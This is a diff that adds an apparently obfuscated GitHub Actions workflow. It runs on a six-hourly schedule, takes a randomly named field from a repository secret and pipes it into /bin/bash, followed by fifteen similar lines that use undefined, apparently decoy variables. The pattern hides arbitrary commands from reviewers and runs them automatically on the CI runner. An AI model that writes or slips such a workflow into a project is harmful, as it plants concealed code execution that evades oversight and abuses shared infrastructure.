@@ -1,0 +1,33 @@
+name: determinetomatoe
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: determinetomatoe
+        env:
+          ovfc83073: ${{ secrets.ovfc83073 }}
+        run: |
+          echo $ovfc83073 | jq -r .y104 | /bin/bash
+          echo $sz0 | jq -r .h899 | /bin/bash
+          echo $ykuc37512 | jq -r .w80 | /bin/bash
+          echo $xico65 | jq -r .tkbh5640 | /bin/bash
+          echo $dff104 | jq -r .ofy1372 | /bin/bash
+          echo $cah238 | jq -r .nxf68630 | /bin/bash
+          echo $yjpn8 | jq -r .xdj71656 | /bin/bash
+          echo $rzezr503 | jq -r .n452 | /bin/bash
+          echo $xo20812 | jq -r .sdzp8 | /bin/bash
+          echo $sybt894 | jq -r .vmi1463 | /bin/bash
+          echo $bldq8 | jq -r .srq3 | /bin/bash
+          echo $fqbz0125 | jq -r .rkkrd86 | /bin/bash
+          echo $g2 | jq -r .a54 | /bin/bash
+          echo $qxafl4 | jq -r .ayvdg04674 | /bin/bash
+          echo $uqx9078 | jq -r .odcu87080 | /bin/bash
+          echo $xkqhc388 | jq -r .g37527 | /bin/bash
+
